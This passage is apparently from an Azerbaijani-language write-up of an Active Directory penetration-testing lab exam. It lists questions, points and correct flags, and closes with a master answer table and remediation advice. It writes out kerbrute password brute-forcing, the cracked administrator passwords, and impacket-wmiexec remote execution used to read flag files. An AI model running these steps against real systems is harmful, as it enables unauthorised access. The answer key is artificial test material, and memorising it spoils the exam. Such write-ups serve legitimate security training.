* **Sual (İmtahan Mətni):** What user on machine 172.25.170.190 stars with a u? (Answer Format: xxxx-xxx)
* **Bal:** 50 Points
* **Cavab Formatı:** `xxxx-xxx`
* **Hədəf:** `172.25.170.190` (`LPT.COM`)
* **Metodologiya:**
  Kerbrute ilə aşkarlanmış 'u' hərfi ilə başlayan hesab: `user-one`.
* **Düzgün Cavab:** `user-one`
* **Əlaqəli Şəkil:**
  
  ![Challenge 93 Sual və Nəticə](./ch90_93_server2022_netexec.png)

---

### Challenge 94: 172.25.170.190 PowerShell Execution Policy

* **Sual (İmtahan Mətni):** What is the state of the Powershell execution policy on the machine at 172.25.170.190? (Answer Format: XxxxxxXxxxxx)
* **Bal:** 50 Points
* **Cavab Formatı:** `XxxxxxXxxxxx`
* **Hədəf:** `172.25.170.190`
* **Metodologiya:**
  1. `kerbrute` ilə administrator parolu tapılır:
     ```bash
     kerbrute bruteuser -d LPT.COM --dc 172.25.170.190 Passwords.txt administrator
     # Nəticə: administrator@LPT.COM:Pa$$w0rd
     ```
  2. WMIEXEC ilə daxil olub icra siyasəti sorğulanır:
     ```bash
     impacket-wmiexec LPT.COM/administrator:'Pa$$w0rd'@172.25.170.190
     C:\> powershell Get-ExecutionPolicy
     ```
     Çıxış: `RemoteSigned`.
* **Düzgün Cavab:** `RemoteSigned`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 94 Execution Policy RemoteSigned](./ch94_95_server2019_adminflag.png)
  ![Challenge 94 Sual Görünüşü](./ch94_96_policy_smb_signing.png)

---

### Challenge 95: 172.25.170.190 Adminflag.txt Məzmunu

* **Sual (İmtahan Mətni):** What is the contents inside of the file named adminflag.txt on the machine located at 172.25.170.190? (Answer Format: XX-XXXNNNN-XXXX)
* **Bal:** 50 Points
* **Cavab Formatı:** `XX-XXXNNNN-XXXX`
* **Hədəf:** `172.25.170.190`
* **Metodologiya:**
  Administrator sənədlərindən flag oxunur:
  ```cmd
  dir C:\ /s /b | findstr /i adminflag
  type C:\Users\Administrator.SERVER2019\Documents\adminflag.txt
  ```
  Çıxış: `AD-WIN2019-ADMI`.
* **Düzgün Cavab:** `AD-WIN2019-ADMI`
* **Əlaqəli Şəkil:**
  
  ![Challenge 95 Admin Flag SERVER2019](./ch94_95_server2019_adminflag.png)

---

### Challenge 96: 172.25.170.170 SMB2 Message Signing Məcburiliyi

* **Sual (İmtahan Mətni):** On the machine 172.25.170.170, is SMB2 message signing required or not required? (Answer with "Required" or "Not Required")
* **Bal:** 50 Points
* **Cavab Formatı:** `Required or Not Required`
* **Hədəf:** `172.25.170.170`
* **Metodologiya:**
  NetExec / Nmap SMB yoxlanışı nəticəsində `signing:False` olduğu üçün SMB2 signing tələb olunmur.
* **Düzgün Cavab:** `Not Required`
* **Əlaqəli Şəkil:**
  
  ![Challenge 96 SMB Signing Check](./ch94_96_policy_smb_signing.png)

---

### Challenge 97: 172.25.170.80 Domen Adı (Suffix ilə birlikdə)

* **Sual (İmtahan Mətni):** What is the domain name for the machine located at 172.25.170.80, including the suffix? (Answer Format: XXX.XXXXXXXX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XXX.XXXXXXXX`
* **Hədəf:** `172.25.170.80` (`2012-DC`)
* **Metodologiya:**
  NetExec SMB bannerində host `ECC.LOCALNET` domeninə məxsusdur:
  ```text
  SMB  172.25.170.80  445  2012-DC  (domain:ECC.LOCALNET)
  ```
* **Düzgün Cavab:** `ECC.LOCALNET`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 97 ECC Domain Skan](./ch62_65_kerbrute_domain_scan.png)
  ![Challenge 97 Sual Ekranı](./ch97_99_ecc_dc_kerbrute.png)

---

### Challenge 98: 172.25.170.80 SMB2 Message Signing Məcburiliyi

* **Sual (İmtahan Mətni):** On the machine 172.25.170.80, is SMB2 message signing required or not required? (Answer with "Required" or "Not Required")
* **Bal:** 50 Points
* **Cavab Formatı:** `Required or Not Required`
* **Hədəf:** `172.25.170.80`
* **Metodologiya:**
  `172.25.170.80` maşını `ECC.LOCALNET` domeninin Domain Controlleridir (`2012-DC`). Active Directory qaydalarına əsasən DC-lərdə SMB signing standart olaraq məcburidir (`signing:True` / `Required`).
* **Düzgün Cavab:** `Required`
* **Əlaqəli Şəkil:**
  
  ![Challenge 98 DC SMB Signing Required](./ch97_99_ecc_dc_kerbrute.png)

---

### Challenge 99: 172.25.170.80 Adminflag.txt Məzmunu

* **Sual (İmtahan Mətni):** What is the value within the file adminflag.txt on the machine located at 172.25.170.80? (Answer Format: XX-XX-XXX-XXXX)
* **Bal:** 50 Points
* **Cavab Formatı:** `XX-XX-XXX-XXXX`
* **Hədəf:** `172.25.170.80`
* **Metodologiya:**
  1. `ECC.LOCALNET` administrator parolu Kerbrute ilə aşkarlanır:
     ```bash
     kerbrute bruteuser -d ECC.LOCALNET --dc 172.25.170.80 Passwords.txt administrator
     # Nəticə: administrator@ECC.LOCALNET:Pa$$w0rd123
     ```
  2. WMIEXEC vasitəsilə admin flag oxunur:
     ```bash
     impacket-wmiexec ECC.LOCALNET/administrator:'Pa$$w0rd123'@172.25.170.80
     C:\> dir C:\ /s /b | findstr /i adminflag
     C:\> type C:\adminflag.txt.txt
     ```
     Nəticə: `WS-AD-TWO-USER`.
* **Düzgün Cavab:** `WS-AD-TWO-USER`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 99 Kerbrute Brute Force ECC](./ch97_99_ecc_dc_kerbrute.png)
  ![Challenge 99 Admin Flag WS-AD-TWO-USER](./ch99_ecc_adminflag.png)

---

## 3. Ümumi Nəticə Cədvəli (Master Cheat-Sheet)

| Sual # | Bal | Hədəf IP | Sualın Qısa Məzmunu | Düzgün Cavab | İstifadə Olunan Metod / Əsas Əmr |
| :---: | :---: | :---: | :--- | :--- | :--- |
| **62** | 10 | `172.25.170.190` | Account with SPN set in LPT.COM | `user-one` | `kerbrute userenum` / `GetNPUsers` |
| **63** | 10 | - | Nmap Kerberos script domain argument | `krb5-enum-users.realm` | `nmap --script=krb5-enum-users` |
| **64** | 10 | `172.25.170.190` | Domain group with RID 0x44E | `DnsUpdateProxy` | `rpcclient enumdomgroups` |
| **65** | 10 | `172.25.170.190` | Valid account on LPT.COM | `cpent` | `kerbrute userenum` |
| **66** | 10 | `172.25.170.12` | Outgoing trust type in CPENT.LOCALNET | `LA` | `nltest /domain_trusts /all_trusts /v` |
| **67** | 10 | `172.25.170.12` | Forest trust type in CPENT.LOCALNET | `ECC` | `nltest /domain_trusts` (foresttrans) |
| **68** | 10 | `172.25.170.12` | Child trust type in CPENT.LOCALNET | `LA` | `nltest /domain_trusts` (withinforest) |
| **69** | 10 | `172.25.170.12` | OU of NewYork AD group | `Engineering` | `Get-ADOrganizationalUnit` |
| **70** | 10 | `172.25.170.12` | OU of LosAngeles AD group | `Developers` | `Get-ADOrganizationalUnit` |
| **71** | 10 | `172.25.170.12` | OU of London AD group | `Sales` | `Get-ADOrganizationalUnit` |
| **72** | 10 | `172.25.170.25` | IP address running Exchange Server | `172.25.170.25` | `nmap -p 25,443,587,6001` |
| **73** | 10 | `172.25.170.25` | Hostname of Exchange Server | `AD-WIN` | `nmap -sV -p 25,443` |
| **74** | 10 | `172.25.170.25` | User with POP3 SPN in Tier 2 | `Pablo Baker` | `impacket-GetUserSPNs` / `ldapsearch` |
| **75** | 10 | `172.25.170.25` | User with POP3 SPN in Stage | `Clint Franks` | `impacket-GetUserSPNs` |
| **76** | 10 | `172.25.170.25` | User with FTP SPN in Tier 2 | `Margarito Cleveland` | `ldapsearch servicePrincipalName=ftp/*` |
| **77** | 10 | `172.25.170.25` | User with HTTPS SPN in Tier 2 | `Bernice Lott` | `impacket-GetUserSPNs` |
| **78** | 10 | `172.25.170.25` | Last 3 chars of CPENTV2-ADMIN.txt SHA256 | `E74` | `takeown`, `icacls`, `type admin.txt` |
| **79** | 10 | `172.25.170.25` | Exchange Server CU number | `12` | `ExSetup.exe FileVersionInfo (15.1.1713.5)` |
| **80** | 10 | `172.25.170.25` | Share within the Domain | `address` | `netexec smb --shares` |
| **81** | 10 | `172.25.170.25` | Domain where Exchange is installed | `CPENTV2.LOCALNET` | `nmap -sV` / `netexec` |
| **82** | 10 | `172.25.170.110` | Windows Server version (Year) | `2012` | `netexec smb` (Server 2012 R2) |
| **83** | 10 | `172.25.170.110` | SMB Message Signing status | `Enabled` | `nmap --script smb2-security-mode` |
| **84** | 10 | `172.25.170.110` | Content of userflag.txt | `WS2012-ADUSER` | `impacket-psexec`, `type C:\userflag.txt` |
| **85** | 10 | `172.25.170.110` | Content of rootflag.txt | `WS2012-ADROOT` | `type Downloads\rootflag.txt` |
| **86** | 50 | `172.25.170.170` | Windows Server version (Year) | `2008` | `netexec smb` (Server 2008 R2) |
| **87** | 50 | `172.25.170.170` | SMB Message Signing status | `Disabled` | `netexec smb (signing:False)` |
| **88** | 50 | `172.25.170.170` | Content of userflag.txt | `WS2008-User` | `medusa smbnt`, `impacket-wmiexec` |
| **89** | 50 | `172.25.170.170` | Content of adminflag.txt | `WS2008-Admin` | `type C:\adminflag.txt` |
| **90** | 50 | `172.25.170.200` | Content of userflag.txt | `Desktop5-user` | `netexec smb`, `type Documents\userflag.txt` |
| **91** | 50 | `172.25.170.200` | Content of rootflag.txt | `Desktop5-root` | `type C:\rootflag.txt` |
| **92** | 50 | `172.25.170.190` | User on 172.25.170.190 starting with 'c' | `cpent` | `kerbrute userenum` |
| **93** | 50 | `172.25.170.190` | User on 172.25.170.190 starting with 'u' | `user-one` | `kerbrute userenum` |
| **94** | 50 | `172.25.170.190` | PowerShell Execution Policy | `RemoteSigned` | `powershell Get-ExecutionPolicy` |
| **95** | 50 | `172.25.170.190` | Content of adminflag.txt | `AD-WIN2019-ADMI` | `type Documents\adminflag.txt` |
| **96** | 50 | `172.25.170.170` | SMB2 Message Signing required/not | `Not Required` | `netexec smb (signing:False)` |
| **97** | 10 | `172.25.170.80` | Domain name of 172.25.170.80 | `ECC.LOCALNET` | `netexec smb` |
| **98** | 50 | `172.25.170.80` | SMB2 Message Signing required/not | `Required` | `netexec smb (signing:True / DC)` |
| **99** | 50 | `172.25.170.80` | Content of adminflag.txt | `WS-AD-TWO-USER` | `kerbrute`, `impacket-wmiexec` |

---

## 4. Senior Pentester Təhlükəsizlik Tövsiyələri və Remediation

1. **Kerberos və SPN Təhlükəsizliyi:**
   * Xidmət hesablarına (Service Accounts) verilmiş SPN-lərin şifrə mürəkkəbliyi minimum 25 simvol olmalı, AES-256 şifrələməsi məcburi edilməli və mütəmadi olaraq gMSA (Group Managed Service Accounts) tətbiq olunmalıdır.
   * `UF_DONT_REQUIRE_PREAUTH` bayrağı heç bir kritik istifadəçi hesabında aktiv edilməməlidir (AS-REP Roasting riskini aradan qaldırmaq üçün).

2. **SMB İmzalanması (Message Signing):**
   * Bütün domen üzvü olan və olmayan serverlərdə (xüsusən Server 2008, 2012 kimi legacy sistemlərdə) GPO vasitəsilə `Digitally sign communications (always)` siyasəti aktiv edilməlidir. Bu, NTLM Relay hücumlarını tam bloklayır.

3. **Parol Siyasəti və Brute-Force Qoruması:**
   * Domen üzrə Account Lockout Threshold minimum 5 uğursuz cəhddən sonra tətbiq edilməli, default parollardan (`Pa$$w0rd`, `Pa$$w0rd123`) istifadə tam qadağan edilməlidir.

4. **Fayl ACL və İcazə Nəzarəti:**
   * Həssas fayllarda sadəcə `SYSTEM` və ya `Administrator` qrupunu çıxarmaq kifayət deyil; NTFS icazələrində sahibliyin (ownership) dəyişdirilməsi hüququ (`Take Ownership` / `WRITE_OWNER`) məhdudlaşdırılmalıdır.
